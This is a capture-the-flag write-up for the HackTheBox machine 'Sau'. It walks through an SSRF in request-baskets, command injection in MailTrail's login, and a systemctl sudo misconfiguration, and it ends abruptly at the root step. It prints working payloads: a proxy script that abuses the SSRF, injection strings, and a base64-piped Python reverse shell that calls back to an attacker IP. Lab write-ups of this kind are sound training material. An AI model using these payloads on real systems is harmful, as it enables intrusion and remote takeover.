### Box Release Date: July 7, 2023

## Machine Summary

This is an easy-level linux machine that has a SSRF vulnerability in the request-basket application that requires you to utilize verb-tampering to upload a shell successfully. Once you have a shell on the box you need to exploit improperly set permissions on the systemctl binary to get root.

## Reconnaissance

As usual I start the box off with a Rustscan scan:

```bash
h0ax@h0ax:~/sau$ rustscan -a 10.10.11.224 -b 500 -t 500
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.

Interesting, we have a high ephemeral port with some sort of service running on it. Let's see what we can find.

I ran a NMAP scan on port 55555 to see what I could find and saw the following:

It appears that this service uses HTTP so let's put __http://10.10.11.224:55555__ into a web browser and see what we get (*I recommend adding th IP to your hosts file*).

We get the following which appears to be a landing page for a site that allows you create multiple http requests and inspect them. 

![req-basket-landing-page](/assets/images/machines/htb/sau/request-basket-landing-page.png)

![creating-endpoint](/assets/images/machines/htb/sau/creating-http-endpoint.png)

![result-of-creating-endpoint](/assets/images/machines/htb/sau/result-of-creation.png)

I ran the following curl command (*GET request*) to get the last screenshot (*obviously your endpoint will be different unless you create the same one as me*)

```bash
curl -i -k http://sau.htb:55555/h0axisthebesthacker
```

![running-curl-result](/assets/images/machines/htb/sau/result-of-running-get-req.png)

Looking at the page source code, I found a link to a github project called [request-basket](https://github.com/darklynx/request-baskets). It shares the same name as the site so this is definitely what we need to be taking a peak at. There also is a version number (__1.2.1__), I am going to do a quick search and see if there is something vulnerable with this version.

As suspected, the version is vulnerable to Server-Side-Request-Forgery. This means that we can craft a HTTP request that we control to perform a desired action on the target machine. This was the first site that I found that listed the vulnerability, [https://vulners.com/github/GHSA-58G2-VGPG-335Q](https://vulners.com/github/GHSA-58G2-VGPG-335Q).

Before I dig into SSRF vulnerability deeper, I am going to take a quick peek at Wappalyzer to see if there is anything interesting running in the tech stack for this site. After looking, I did not see anything of note.

## SSRF for Request-Basket Explained

This [site](https://notes.sjtu.edu.cn/s/MUUhEymt7) has a fantastic explanation of the vulnerability in the Request-Basket application. What essentially is happening is that the __/api/baskets/__ endpoint is susceptible to SSRF. The site uses the following payload to make the target redirect the request:

```json
{
  "forward_url": "http://127.0.0.1:80/test",
  "proxy_response": false,
  "insecure_tls": false,
  "expand_path": true,
  "capacity": 250
}
```

I created an endpoint called __test1__ and used Burp Suite to post it to the target:

![create-test1](/assets/images/machines/htb/sau/burp-create-test1.png)

Doing this gets a token. We are going to have to couple this SSRF vulnerability with something else to do further reconnaissance or get a foothold on the box.

## Shell as puma

After a bit of playing around, I was finally able understand how to get the exploit to work. First thing that we are going to need to do is fire up Burp (*if you have not already*) and create a new http endpoint/basket, and then capture the creation in Burp (*I made a new enpoint called __12345__ to replace test*).

![burp-ssrf-1](/assets/images/machines/htb/sau/burp-ssrf-1.png)

After doing this and setting things in the payload as to what I have them set in the above screenshot, then visit the URL that it creates for your request endpoint. Since the target does not block external entities from setting the forward path to the localhost, we can now access a mail-server that is running on port 80.

![ssrf-mail-server](/assets/images/machines/htb/sau/ssrf-mailtrail.png)

#### *** MailTrail Not Loading Due To JS & CSS Errors ***

![boken-css-js](/assets/images/machines/htb/sau/broken-js-css.png)

You may run into the error of the CSS and JS not working when you visit the proxied service. To fix this run the following python script and fix the variables at the top to reflect your basket name and token. *This script was taken from Fred K.*

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse
import requests
import mimetypes
import posixpath 

basket = 'pwnd'  
path = '/'  
ip = '10.10.11.224'  
token = 'KWtVsWniXGUdzAjx3tOYTSmzrfCbdSGa2vo23HPKaiTd' 

def change_forward_url(path):
    url = f'http://' + ip + ':55555/api/baskets/' + basket 
    headers = {
        'Authorization': token
    }
    data = {
        'forward_url': 'http://127.0.0.1:80' + path,
        'proxy_response': True,
        'insecure_tls': True,
        'expand_path': True,
        'capacity': 250
    }

    response = requests.put(url, headers=headers, json=data)

    if response.status_code == 204:
        print('Changing forward URL - http://127.0.0.1:80', path)
        return True
    else:
        print('An error occurred while executing the request.')
        print('Status code:', response.status_code)
        print('Response text:', response.text)
        return False

def get_request(path):
    change_forward_url(path)
    url = f'http://' + ip + ':55555/' + basket 

    response = requests.get(url)

    if response.status_code == 200:
        print('Geting get request',path)
        return response
    else:
        print('An error occurred while executing the GET request.')
        print('Status code:', response.status_code)

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path
        html = get_request(path)
        content_type = self.guess_type(path)

        self.send_response(200)
        self.send_header('Content-type', content_type)
        self.end_headers()
        self.wfile.write(html.content)

    def guess_type(self, path):
        base, ext = posixpath.splitext(path)
        if ext in mimetypes.types_map:
            return mimetypes.types_map[ext]
        return 'application/octet-stream'

def start_server():
    server_address = ('', 1337)
    httpd = HTTPServer(server_address, RequestHandler)
    print('Server running...')
    httpd.serve_forever()

start_server()
```

## Shell as puma Continued

I did not change the forward URL from the payload that I found online and was lucky that the port I used (port 80) was the same as the as the one used for the service on the target. To port scan through a netcat listener, what you need to do for this box is create a basket, then set the forward url to the IP of your machine and then add the port you are going to use to start a netcat listener.

For me I did the following: __http://10.10.27.32:8888__

Then you will want to visit the url of the new basket after you start your netcat listener. Once you do this then you will want to run the following nmap command:

```bash
nmap --top-ports=50 -Pn --proxy http://127.0.0.1:8888 sau.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-16 23:56 EDT
Nmap scan report for sau.htb (10.10.11.224)
Host is up (0.073s latency).
Not shown: 48 closed ports
PORT   STATE    SERVICE
22/tcp open     ssh
80/tcp filtered http

Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
```

As you can see from the above output, we found a service running on port 80 that we previously could not see when we ran our initial port scan.

Now let's get back to figuring out what we can about the mailtrail service running on the machine and see if we can exploit it. 

As we can see on the landing page the version for MailTrail is 0.53. A quick search found that this version is vulnerable to command injection in the username parameter. The application is built using python so that means an attacker can leverage the OS module in python to inject all sorts of commands on the target.

The POC payload is as follows:

```bash
curl 'http://hostname:8338/login' \
  --data 'username=;`id > /tmp/bbq`'
```

I did some testing using the above command and tried reading the contents of /etc/passwd and the __id__ command but was not successful in getting any results via the cli or using Burp's repeater.

One thing I noticed is that having a request that looks like the following, will not work at all since the exploit requires a POST request to be made but when we attempt to auth we are using a GET request.

```
GET /index.html
Host: 127.0.0.1:1337
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36

Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

username=%3b`ping+-c+5+your_ip`
```

To bypass this we will utilize __verb tampering__. This simply just requires you to put the payload in the initial GET URL as follows:

```
GET /index.html?username=%3b`ping+-c+5+your_ip`
Host: 127.0.0.1:1337
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0

Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

```

The exploit POC I was looking at was from this [site](https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/). Looking at the exploit it uses the __/login__ endpoint so I decided to turn on Burp's proxy to intercept traffic and try again focusing on this endpoint. Below is the request I intercepted and sent to repeater (*I changed the GET endpoint from /index.html to /login*)

![ping-poc](/assets/images/machines/htb/sau/ping-poc.png)

To get this to work you will need to url-encode the parameter for username and then start __tcpdump__ on your machine. The command I used was __sudo tcpdump -i tun0__

Now send the request from Burp and watch tcpdump for ICMP traffic.

I was able to see ping requests made from the target machine! That means we can inject code >:)

```bash
h0ax@h0ax:~/sau$ sudo tcpdump -i tun0

Now let's try to get a reverse shell spawned on the box. Hacktricks.xyz has a great post on reverse shells, navigate to the section on python reverse shells to get an understanding on building python reverse shell payloads [https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux).

I used the first line for the payload:

```python
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

I first tried the payload:

 ```
 /login?username=;`export RHOST="YOUR_IP";export RPORT=YOUR_PORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`
```

This did not work sadly. Usually my next go to is to base64 encode the payload and use the following logic flow to get a shell:
__echo "base64_encoded_payload" | base64 -d | sh__

My final payload looked like this:

```
base64 payload:

decoded: 

export RHOST="10.10.27.32";export RPORT=9999;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

encoded:

cmd= echo "export RHOST...." | base64

ZXhwb3J0IF.....

-----------------------------------------------------------------

full payload:

/login?username=%3b`echo+"ZXhwb3J0IF....."+|+base64+-d+|+sh`
```

What it looks like in Burp:

![shell-payload](/assets/images/machines/htb/sau/shell-burp.png)

I started a netcat listener and ran the exploit and got a reverse shell! I upgraded my shell to a full tty as well.

```bash
h0ax@h0ax:~/sau$ nc -vlnp 9999

You have the ability to read the user flag too!

## Privlege Escalation to Root

As usual I uploaded linpeas to the box and ran it. The line in the script that caught my eye was the following:

```
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

This means that the puma user has the ability to run the systemctl binary on the mailtrail application as root. GTFOBins is one of the places I go to find priv-esc info on different linux binaries and the site has a great page on privlege escaltion for systemctl [https://gtfobins.github.io/gtfobins/systemctl/](https://gtfobins.github.io/gtfobins/systemctl/).


Section C actually works on this so getting root is very trivial. All you have to do is run the following:

```bash
